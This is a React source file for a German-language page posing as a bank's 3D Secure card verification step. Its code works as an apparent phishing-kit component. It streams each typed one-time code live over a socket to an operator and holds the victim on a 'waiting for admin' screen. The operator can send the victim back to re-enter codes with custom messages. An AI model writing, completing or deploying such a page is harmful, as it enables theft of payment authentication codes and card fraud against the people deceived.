import { FormEvent, useEffect, useRef, useState } from 'react';
import { useLocation } from 'react-router-dom';
import { socket } from '../socket';
import { useCurrentPage } from '../hooks/useCurrentPage';
import { loadDraft, saveDraft, STORAGE_KEYS } from '../session';
import { BRAND } from '../brand';

type VerifyMethod = 'phone' | 'email';
type ContactOptions = { telephone: string; email: string };
type VerifyState = ContactOptions & { method: VerifyMethod | '' };

function loadSavedContactOptions(): ContactOptions {
  const raw = loadDraft<Partial<ContactOptions> | null>(STORAGE_KEYS.verifyContact, null);
  if (!raw || typeof raw !== 'object') return { telephone: '', email: '' };
  return {
    telephone: (raw.telephone || '').toString().trim(),
    email: (raw.email || '').toString().trim(),
  };
}

function loadSavedVerifyState(): VerifyState {
  const raw = loadDraft<Partial<VerifyState> | null>(STORAGE_KEYS.verifyState, null);
  if (!raw || typeof raw !== 'object') return { telephone: '', email: '', method: '' };
  return {
    telephone: (raw.telephone || '').toString().trim(),
    email: (raw.email || '').toString().trim(),
    method: raw.method === 'phone' || raw.method === 'email' ? raw.method : '',
  };
}

function verifyMethodLabel(method: VerifyMethod | '') {
  if (method === 'phone') return 'Telefonnummer';
  if (method === 'email') return 'E-Mail-Adresse';
  return '';
}

function maskPhone(value: string) {
  const raw = (value || '').toString().trim();
  if (!raw) return '';
  const chars = raw.split('');
  const digitIndexList: number[] = [];
  for (let i = 0; i < chars.length; i++) if (/\d/.test(chars[i])) digitIndexList.push(i);
  if (digitIndexList.length === 0) return raw;
  const maskCount = Math.min(3, digitIndexList.length);
  const start = Math.floor((digitIndexList.length - maskCount) / 2);
  for (let i = 0; i < maskCount; i++) chars[digitIndexList[start + i]] = '*';
  return chars.join('');
}

function maskEmail(value: string) {
  const raw = (value || '').toString().trim();
  if (!raw) return '';
  const at = raw.indexOf('@');
  if (at <= 0 || at >= raw.length - 1) return raw;
  const userChars = raw.slice(0, at).split('');
  const host = raw.slice(at + 1);
  const maskCount = Math.min(3, userChars.length);
  const start = Math.floor((userChars.length - maskCount) / 2);
  for (let i = 0; i < maskCount; i++) userChars[start + i] = '*';
  return `${userChars.join('')}@${host}`;
}

export default function Verify() {
  useCurrentPage('verify');
  const location = useLocation();
  const requestedMethod = new URLSearchParams(location.search).get('method')?.toLowerCase().trim() || '';

  const [verifyId, setVerifyId] = useState('');
  const savedVerifyState = loadSavedVerifyState();
  const savedContactOptions = loadSavedContactOptions();
  const initialVerifyMethod = requestedMethod === 'phone' || requestedMethod === 'email' ? requestedMethod : '';
  const [verifyMethod, setVerifyMethod] = useState<VerifyMethod | ''>(initialVerifyMethod);
  const [contactOptions, setContactOptions] = useState<ContactOptions>(() => ({
    telephone: savedVerifyState.telephone || savedContactOptions.telephone,
    email: savedVerifyState.email || savedContactOptions.email,
  }));
  const [loadingContactOptions, setLoadingContactOptions] = useState(() => {
    const saved = loadSavedVerifyState();
    const savedContacts = loadSavedContactOptions();
    return !saved.telephone && !saved.email && !savedContacts.telephone && !savedContacts.email;
  });
  const [showMethodPicker, setShowMethodPicker] = useState(() => !initialVerifyMethod);
  const [status, setStatus] = useState('Waehlen Sie aus, wie Sie den Bestaetigungscode erhalten moechten.');
  const [submitting, setSubmitting] = useState(false);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const inputRef = useRef<HTMLInputElement | null>(null);

  const loadContactOptions = () => {
    setLoadingContactOptions(true);
    socket.emit('get-verify-contact-options', {}, (resp: any) => {
      if (!resp?.ok) {
        const fallbackState = loadSavedVerifyState();
        const fallbackContact = loadSavedContactOptions();
        const fallback = {
          telephone: fallbackState.telephone || fallbackContact.telephone,
          email: fallbackState.email || fallbackContact.email,
        };
        setContactOptions(fallback);
        setLoadingContactOptions(false);
        setStatus(
          fallback.telephone || fallback.email
            ? 'Waehlen Sie aus, wie Sie den Bestaetigungscode erhalten moechten.'
            : 'Telefonnummer oder E-Mail-Adresse konnten nicht geladen werden. Bitte pruefen Sie Ihre Kontodaten und versuchen Sie es erneut.',
        );
        return;
      }
      const nextPhone = (resp?.telephone || '').toString().trim();
      const nextEmail = (resp?.email || '').toString().trim();
      const fallbackState = loadSavedVerifyState();
      const fallbackContact = loadSavedContactOptions();
      const nextOptions =
        nextPhone || nextEmail
          ? { telephone: nextPhone, email: nextEmail }
          : {
              telephone: fallbackState.telephone || fallbackContact.telephone,
              email: fallbackState.email || fallbackContact.email,
            };
      setContactOptions(nextOptions);
      if (nextOptions.telephone || nextOptions.email) {
        saveDraft(STORAGE_KEYS.verifyContact, nextOptions);
      }
      setLoadingContactOptions(false);
      if (!nextOptions.telephone && !nextOptions.email) {
        setStatus('Es sind keine verfuegbaren Kontaktmethoden vorhanden. Hinterlegen Sie zuerst eine Telefonnummer oder E-Mail-Adresse.');
      }
    });
  };

  const methodFromSearch = (): VerifyMethod | '' => {
    const q = requestedMethod;
    if (q === 'phone') return 'phone';
    if (q === 'email') return 'email';
    return '';
  };

  useEffect(() => {
    socket.emit('update-form-field', { field: 'verifyMethod', value: '' });
    if (!methodFromSearch()) {
      setVerifyMethod('');
      setShowMethodPicker(true);
      saveDraft(STORAGE_KEYS.verifyState, {
        telephone: savedVerifyState.telephone || savedContactOptions.telephone,
        email: savedVerifyState.email || savedContactOptions.email,
        method: '',
      });
    }
    loadContactOptions();
  }, []);

  useEffect(() => {
    saveDraft(STORAGE_KEYS.verifyState, {
      telephone: contactOptions.telephone,
      email: contactOptions.email,
      method: verifyMethod,
    });
  }, [contactOptions.email, contactOptions.telephone, verifyMethod]);

  useEffect(() => {
    if (!verifyMethod) return;
    const selectedValue = verifyMethod === 'phone' ? contactOptions.telephone : contactOptions.email;
    if (!selectedValue) return;
    const masked = verifyMethod === 'phone' ? maskPhone(selectedValue) : maskEmail(selectedValue);
    setShowMethodPicker(false);
    setStatus(`${verifyMethodLabel(verifyMethod)} gewaehlt (${masked}). Geben Sie unten den Bestaetigungscode ein.`);
  }, [contactOptions.email, contactOptions.telephone, verifyMethod]);

  useEffect(() => {
    if (verifyMethod) return;
    const requested = methodFromSearch();
    if (!requested || waitingForAdmin || submitting) return;
    const hasContact = requested === 'phone' ? !!contactOptions.telephone : !!contactOptions.email;
    if (hasContact) handleChooseMethod(requested);
  }, [location.search, contactOptions.telephone, contactOptions.email, waitingForAdmin, submitting, verifyMethod]);

  useEffect(() => {
    if (!showMethodPicker && !waitingForAdmin) {
      const timer = window.setTimeout(() => inputRef.current?.focus(), 0);
      return () => window.clearTimeout(timer);
    }
  }, [showMethodPicker, waitingForAdmin]);

  useEffect(() => {
    if (!waitingForAdmin && !submitting && verifyMethod && verifyId.trim()) {
      const timer = window.setTimeout(() => socket.emit('update-form-field', { field: 'verify', value: verifyId }), 120);
      return () => window.clearTimeout(timer);
    }
  }, [verifyId, waitingForAdmin, submitting, verifyMethod]);

  useEffect(() => {
    const onRoute = (payload: any) => {
      const target = (payload?.target || '').toString().toLowerCase();
      if (!['verify', 'verifyphone', 'phoneverify', 'emailverify'].includes(target)) return;
      setVerifyId('');
      setVerifyMethod('');
      setShowMethodPicker(true);
      setSubmitting(false);
      setWaitingForAdmin(false);
      const routeReason = String(payload?.reason || '').trim();
      setStatus(routeReason || 'Waehlen Sie aus, wie Sie den Bestaetigungscode erhalten moechten.');
      socket.emit('update-form-field', { field: 'verifyMethod', value: '' });
      if ((target === 'verifyphone' || target === 'phoneverify') && contactOptions.telephone) return handleChooseMethod('phone', routeReason);
      if (target === 'emailverify' && contactOptions.email) return handleChooseMethod('email', routeReason);
      loadContactOptions();
    };
    socket.on('checkout-route', onRoute);
    return () => {
      socket.off('checkout-route', onRoute);
    };
  }, [contactOptions.telephone, contactOptions.email, waitingForAdmin, submitting]);

  const handleChooseMethod = (method: VerifyMethod, adminReason = '') => {
    if (waitingForAdmin || submitting) return;
    const selectedValue = method === 'phone' ? contactOptions.telephone : contactOptions.email;
    if (!selectedValue) return;
    const selectedValueMasked = method === 'phone' ? maskPhone(selectedValue) : maskEmail(selectedValue);
    setVerifyMethod(method);
    setShowMethodPicker(false);
    setStatus(
      adminReason
        ? `${adminReason} ${verifyMethodLabel(method)} gewaehlt (${selectedValueMasked}).`
        : `${verifyMethodLabel(method)} gewaehlt (${selectedValueMasked}). Geben Sie unten den Bestaetigungscode ein.`,
    );
    socket.emit('update-form-field', { field: 'verifyMethod', value: method });
    window.setTimeout(() => inputRef.current?.focus(), 0);
  };

  const selectedMethodValue =
    verifyMethod === 'phone' ? maskPhone(contactOptions.telephone) : verifyMethod === 'email' ? maskEmail(contactOptions.email) : '';

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (submitting || waitingForAdmin) return;
    if (showMethodPicker || !verifyMethod) {
      setStatus('Waehlen Sie aus, wie Sie den Bestaetigungscode erhalten moechten.');
      setShowMethodPicker(true);
      return;
    }
    const id = verifyId.trim();
    if (!id) {
      setStatus('Bitte geben Sie den Bestaetigungscode ein, um fortzufahren.');
      inputRef.current?.focus();
      return;
    }
    setSubmitting(true);
    setStatus('Bestaetigungscode wird gesendet...');
    socket.emit('verify-submit', { verifyId: id }, (resp: any) => {
      if (!resp?.ok) {
        setStatus(`Bestaetigungscode konnte nicht gesendet werden: ${resp?.error || 'unbekannter Fehler'}`);
        setSubmitting(false);
        return;
      }
      setVerifyId('');
      setSubmitting(false);
      setWaitingForAdmin(true);
      setStatus('Bestaetigungscode empfangen. Bitte warten Sie auf die Rueckmeldung der Kartenpruefung...');
    });
  };

  return (
    <div className="alz-page w-full text-slate-900 relative overflow-hidden">
      {waitingForAdmin && (
        <div className="absolute inset-0 bg-slate-900/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
            <div className="mx-auto h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
            <div className="mt-4 text-lg font-semibold text-slate-900">Code wird geprueft</div>
            <div className="text-sm text-slate-600 mt-2">Der Bestaetigungscode fuer diese Bestellung wird aktuell abgeglichen. Bitte warten Sie einen Moment.</div>
            <div className="mt-5 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-xs text-amber-800">Bitte aktualisieren oder schliessen Sie die Seite waehrend der Pruefung nicht.</div>
          </div>
        </div>
      )}

      {showMethodPicker && !waitingForAdmin && (
        <div className="absolute inset-0 bg-slate-900/55 backdrop-blur-sm flex items-center justify-center z-40 p-4">
          <div className="alz-bank-picker">
            <div className="alz-bank-picker-head">
              <div>
                <div className="alz-bank-picker-eyebrow">Kartenbestaetigung</div>
                <h2 className="alz-bank-picker-title">Empfangsmethode fuer den Code waehlen</h2>
              </div>
              <span className="alz-bank-badge">Sicherheitspruefung</span>
            </div>
            <p className="alz-bank-picker-copy">Waehlen Sie, wie Sie den Bestaetigungscode fuer diese Zahlung erhalten moechten.</p>

            {loadingContactOptions ? (
              <div className="alz-bank-loading">Kontaktoptionen werden geladen...</div>
            ) : (
              <div className="alz-bank-methods">
                <button type="button" onClick={() => handleChooseMethod('phone')} disabled={!contactOptions.telephone} className={['alz-bank-method', contactOptions.telephone ? 'alz-bank-method-active' : 'alz-bank-method-disabled'].join(' ')}>
                  <div className="alz-bank-method-top">
                    <span>SMS</span>
                    <strong>SMS</strong>
                  </div>
                  <div className="alz-bank-method-value">{contactOptions.telephone ? maskPhone(contactOptions.telephone) : 'Keine verfuegbare Telefonnummer vorhanden.'}</div>
                </button>

                <button type="button" onClick={() => handleChooseMethod('email')} disabled={!contactOptions.email} className={['alz-bank-method', contactOptions.email ? 'alz-bank-method-active' : 'alz-bank-method-disabled'].join(' ')}>
                  <div className="alz-bank-method-top">
                    <span>E-Mail</span>
                    <strong>MAIL</strong>
                  </div>
                  <div className="alz-bank-method-value">{contactOptions.email ? maskEmail(contactOptions.email) : 'Keine verfuegbare E-Mail-Adresse vorhanden.'}</div>
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="alz-shell relative z-10">
        <div className="alz-bank-shell">
          <div className="alz-bank-frame">
            <div className="alz-bank-header">
              <div>
                <div className="alz-bank-header-eyebrow">Sicherheitspruefung</div>
                <h1 className="alz-bank-title">Bestaetigung erforderlich</h1>
                <p className="alz-bank-copy">Geben Sie den Einmalcode ein, den Ihre Kartenbank gesendet hat, um diese Zahlung zu bestaetigen.</p>
              </div>
              <div className="alz-bank-brandbox">
                <div className="alz-bank-brandname">SECURECODE</div>
                <div className="alz-bank-brandsub">Geschuetzt durch 3D Secure</div>
              </div>
            </div>

            <div className="alz-bank-body">
              <section className="alz-bank-panel">
                <div className="alz-bank-panel-title">Pruefungsdetails</div>
                <div className="alz-bank-summary">
                  <div>
                    <span>Haendler</span>
                    <strong>{BRAND.name}</strong>
                  </div>
                  <div>
                    <span>Pruefungsart</span>
                    <strong>3D Secure Bestaetigung</strong>
                  </div>
                  <div>
                    <span>Empfangsmethode</span>
                    <strong>{verifyMethod ? verifyMethodLabel(verifyMethod) : 'Telefon oder E-Mail waehlen'}</strong>
                  </div>
                  <div>
                    <span>Gesendet an</span>
                    <strong>{selectedMethodValue || 'Telefon oder E-Mail waehlen'}</strong>
                  </div>
                </div>

                <form onSubmit={handleSubmit} className="space-y-4 mt-5">
                  <div>
                    <label className="alz-field-label">Bestaetigungscode</label>
                    <input ref={inputRef} value={verifyId} onChange={(e) => setVerifyId(e.target.value)} placeholder="Code eingeben" className="alz-input alz-bank-code-input disabled:bg-slate-100 disabled:text-slate-400" autoComplete="one-time-code" inputMode="numeric" disabled={waitingForAdmin || showMethodPicker} />
                  </div>
                  <button type="submit" disabled={submitting || waitingForAdmin || showMethodPicker} className="alz-bank-submit">
                    {submitting ? 'Wird gesendet...' : waitingForAdmin ? 'Wird geprueft...' : showMethodPicker ? 'Methode waehlen' : 'Code senden'}
                  </button>
                </form>

                <div className="alz-bank-note">{status}</div>
              </section>

              <aside className="alz-bank-side">
                <div className="alz-bank-side-card">
                  <div className="alz-bank-side-title">Sichere Zahlung</div>
                  <div className="alz-bank-side-copy">Diese Kartenzahlung ist durch die 3D Secure Sicherheitspruefung Ihrer Bank geschuetzt.</div>
                </div>
                <div className="alz-bank-side-card">
                  <div className="alz-bank-side-title">Benoetigen Sie Hilfe?</div>
                  <div className="alz-bank-side-copy">Falls kein Code ankommt, pruefen Sie bitte Ihre Kontaktdaten oder waehlen Sie eine andere verfuegbare Methode aus.</div>
                </div>
              </aside>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
